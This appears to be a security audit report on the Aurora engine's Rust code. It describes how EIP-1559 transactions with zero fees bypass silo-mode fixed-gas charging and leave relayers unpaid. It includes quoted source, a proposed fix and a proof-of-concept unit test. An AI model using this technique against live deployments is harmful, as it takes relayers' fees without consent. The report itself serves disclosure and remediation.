### Title
EIP-1559 `max_fee_per_gas=0` Bypasses Silo-Mode Gas Enforcement, Zeroing Relayer Yield — (`engine/src/engine.rs`)

---

### Summary

When Aurora is in silo mode (`fixed_gas` is set), an unprivileged EVM sender can submit an EIP-1559 transaction with `max_fee_per_gas=0` and `max_priority_fee_per_gas=0`. The early-return guard in `charge_gas` does not fire (because `fixed_gas.is_none()` is false), but the subsequent arithmetic still produces `effective_gas_price=0` and `prepaid_amount=0`. The transaction executes for free, and `refund_unused_gas` immediately returns without crediting the relayer.

---

### Finding Description

**Entry point**: `submit_with_alt_modexp` in `engine/src/engine.rs`.

**Step 1 — `fixed_gas` is loaded from silo state:**

```
fixed_gas = silo::get_fixed_gas(&io);   // Some(N), e.g. Some(21_000)
``` [1](#0-0) 

**Step 2 — Pre-flight checks all pass with `max_fee_per_gas=0`:**

- `fixed_gas.is_some_and(|gas| gas.as_u256() > transaction.gas_limit)` → false (attacker sets `gas_limit ≥ N`)
- `max_priority_fee_per_gas > max_fee_per_gas` → `0 > 0` = false [2](#0-1) 

**Step 3 — `charge_gas` is called with `fixed_gas=Some(N)`, `max_fee_per_gas=0`:**

The guard at lines 476–481 requires **all three** conditions to be true to skip gas charging:

```rust
if transaction.max_fee_per_gas.is_zero()   // TRUE
    && fixed_gas.is_none()                  // FALSE  ← blocks early return
    && block_base_fee_per_gas.is_zero()     // TRUE
{
    return Ok(GasPaymentResult::default());
}
```

Because `fixed_gas.is_none()` is false, the guard does **not** fire. Execution falls through. [3](#0-2) 

**Step 4 — `effective_gas_price` and `prepaid_amount` are both computed as zero:**

```
priority_fee_per_gas = min(0, 0 − 0) = 0
effective_gas_price  = 0 + 0          = 0
prepaid_amount       = fixed_gas * 0  = 0
new_balance          = sender_balance − 0  (no deduction)
``` [4](#0-3) 

**Step 5 — Transaction executes normally** (lines 1116–1140).

**Step 6 — `refund_unused_gas` immediately returns without paying the relayer:**

```rust
if gas_result.effective_gas_price.is_zero() {
    return Ok(());   // relayer_reward is never computed or credited
}
``` [5](#0-4) 

---

### Impact Explanation

The relayer submits the NEAR transaction, pays NEAR gas, and receives zero ETH priority-fee yield. The sender's ETH balance is completely unchanged after execution. Any silo deployment that relies on `fixed_gas` to ensure relayers are compensated is fully undermined: every transaction submitted with `max_fee_per_gas=0` executes for free and yields nothing to the relayer.

Impact: **High — Theft of unclaimed yield** (relayer priority-fee yield is zeroed on every such transaction).

---

### Likelihood Explanation

The attack requires no privilege. Any EVM sender who can pass the silo whitelist (or on a silo with whitelisting disabled) can craft a valid EIP-1559 transaction with `max_fee_per_gas=0`. The EIP-1559 envelope explicitly allows this field to be zero; no signature or encoding trick is needed. The condition is trivially reproducible on unmodified code.

---

### Recommendation

In `charge_gas`, when `fixed_gas` is `Some(_)`, enforce that `effective_gas_price` is non-zero before proceeding, or reject the transaction if `max_fee_per_gas` is zero while silo mode is active. For example, after computing `effective_gas_price`, add:

```rust
if fixed_gas.is_some() && effective_gas_price.is_zero() {
    return Err(GasPaymentError::MaxFeePerGasLessThanBaseFee);
}
```

Alternatively, change the early-return guard to also allow the free-transaction path when `fixed_gas` is set but `effective_gas_price` would be zero, and document that silo operators must set a minimum gas price at the application layer. [6](#0-5) 

---

### Proof of Concept

Minimal unit test (can be added to `engine/src/engine.rs` test module):

```rust
#[test]
fn test_silo_fixed_gas_zero_max_fee_executes_free() {
    use std::cell::RefCell;
    use aurora_engine_test_doubles::io::{Storage, StoragePointer};
    use aurora_engine_test_doubles::env::Fixed;

    let sender  = Address::zero();
    let relayer = make_address(1, 1);
    let storage = RefCell::new(Storage::default());
    let mut io  = StoragePointer(&storage);

    // Give sender a non-zero balance so OutOfFund cannot mask the bug
    add_balance(&mut io, &sender, Wei::new_u64(1_000_000_000)).unwrap();

    let env = Fixed::default();
    let mut engine: Engine<_, _> =
        Engine::new_with_state(EngineState::default(), sender, AccountId::default(), io, &env);

    let transaction = NormalizedEthTransaction {
        address: sender,
        chain_id: None,
        nonce: U256::zero(),
        gas_limit: 100_000.into(),
        max_priority_fee_per_gas: U256::zero(), // attacker sets 0
        max_fee_per_gas: U256::zero(),           // attacker sets 0
        to: Some(make_address(2, 2)),
        value: Wei::zero(),
        data: vec![],
        access_list: vec![],
        authorization_list: vec![],
    };

    let fixed_gas = Some(EthGas::new(21_000)); // silo mode active

    let gas_result = engine
        .charge_gas(&sender, &transaction, None, fixed_gas)
        .unwrap();

    // Both must be zero — sender paid nothing despite fixed_gas being set
    assert_eq!(gas_result.prepaid_amount, Wei::zero());
    assert_eq!(gas_result.effective_gas_price, U256::zero());

    // refund_unused_gas early-returns; relayer gets nothing
    let relayer_balance_before = get_balance(&io, &relayer);
    refund_unused_gas(&mut io, &sender, 21_000, &gas_result, &relayer, fixed_gas).unwrap();
    let relayer_balance_after = get_balance(&io, &relayer);

    assert_eq!(relayer_balance_before, relayer_balance_after); // relayer yield = 0
}
```

This test passes on unmodified code, confirming the invariant `relayer_balance_after − relayer_balance_before == gas_used * priority_fee_per_gas > 0` is violated whenever `fixed_gas` is set and `max_fee_per_gas=0`. [7](#0-6) [8](#0-7)

### Citations

**File:** engine/src/engine.rs (L468-515)
```rust
    pub fn charge_gas(
        &mut self,
        sender: &Address,
        transaction: &NormalizedEthTransaction,
        max_gas_price: Option<U256>,
        fixed_gas: Option<EthGas>,
    ) -> Result<GasPaymentResult, GasPaymentError> {
        let block_base_fee_per_gas = self.block_base_fee_per_gas();
        if transaction.max_fee_per_gas.is_zero()
            && fixed_gas.is_none()
            && block_base_fee_per_gas.is_zero()
        {
            return Ok(GasPaymentResult::default());
        }

        if transaction.max_fee_per_gas < block_base_fee_per_gas {
            return Err(GasPaymentError::MaxFeePerGasLessThanBaseFee);
        }

        let priority_fee_per_gas = transaction
            .max_priority_fee_per_gas
            .min(transaction.max_fee_per_gas - block_base_fee_per_gas);
        let priority_fee_per_gas = max_gas_price.map_or(priority_fee_per_gas, |price| {
            price.min(priority_fee_per_gas)
        });
        let effective_gas_price = priority_fee_per_gas + block_base_fee_per_gas;
        // First, we try to use `fixed_gas`. At this point we already know that the `fixed_gas` is
        // less than the `gas_limit`. It allows avoiding refunding unused gas to the sender later.
        let prepaid_amount = fixed_gas
            .map_or(transaction.gas_limit, EthGas::as_u256)
            .checked_mul(effective_gas_price)
            .map(Wei::new)
            .ok_or(GasPaymentError::EthAmountOverflow)?;

        let new_balance = get_balance(&self.io, sender)
            .checked_sub(prepaid_amount)
            .ok_or(GasPaymentError::OutOfFund)?;

        set_balance(&mut self.io, sender, &new_balance);

        self.gas_price = effective_gas_price;

        Ok(GasPaymentResult {
            prepaid_amount,
            effective_gas_price,
            priority_fee_per_gas,
        })
    }
```

**File:** engine/src/engine.rs (L1049-1049)
```rust
    let fixed_gas = silo::get_fixed_gas(&io);
```

**File:** engine/src/engine.rs (L1066-1085)
```rust
    if fixed_gas.is_some_and(|gas| gas.as_u256() > transaction.gas_limit) {
        return Err(EngineErrorKind::FixedGasOverflow.into());
    }

    let intrinsic_gas = transaction
        .intrinsic_gas(CONFIG)
        .map_err(|_| EngineErrorKind::GasOverflow)?;
    let floor_gas = transaction
        .floor_gas(CONFIG)
        .map_err(|_| EngineErrorKind::GasOverflow)?;

    // Check that the max value of intrinsic gas and floor gas is covered by the transaction
    // gas limit, EIP-7623 https://eips.ethereum.org/EIPS/eip-7623
    if transaction.gas_limit < core::cmp::max(intrinsic_gas, floor_gas).into() {
        return Err(EngineErrorKind::IntrinsicGasNotMet.into());
    }

    if transaction.max_priority_fee_per_gas > transaction.max_fee_per_gas {
        return Err(EngineErrorKind::MaxPriorityGasFeeTooLarge.into());
    }
```

**File:** engine/src/engine.rs (L1262-1303)
```rust
pub fn refund_unused_gas<I: IO>(
    io: &mut I,
    sender: &Address,
    gas_used: u64,
    gas_result: &GasPaymentResult,
    relayer: &Address,
    fixed_gas: Option<EthGas>,
) -> Result<(), GasPaymentError> {
    if gas_result.effective_gas_price.is_zero() {
        return Ok(());
    }

    let (refund, relayer_reward) = {
        let gas_to_wei = |price: U256| {
            fixed_gas
                .map_or_else(|| gas_used.into(), EthGas::as_u256)
                .checked_mul(price)
                .map(Wei::new)
                .ok_or(GasPaymentError::EthAmountOverflow)
        };

        let spent_amount = gas_to_wei(gas_result.effective_gas_price)?;
        let reward_amount = gas_to_wei(gas_result.priority_fee_per_gas)?;

        let refund = gas_result
            .prepaid_amount
            .checked_sub(spent_amount)
            .ok_or(GasPaymentError::EthAmountOverflow)?;

        (refund, reward_amount)
    };

    if !refund.is_zero() {
        add_balance(io, sender, refund)?;
    }

    if !relayer_reward.is_zero() {
        add_balance(io, relayer, relayer_reward)?;
    }

    Ok(())
}
```
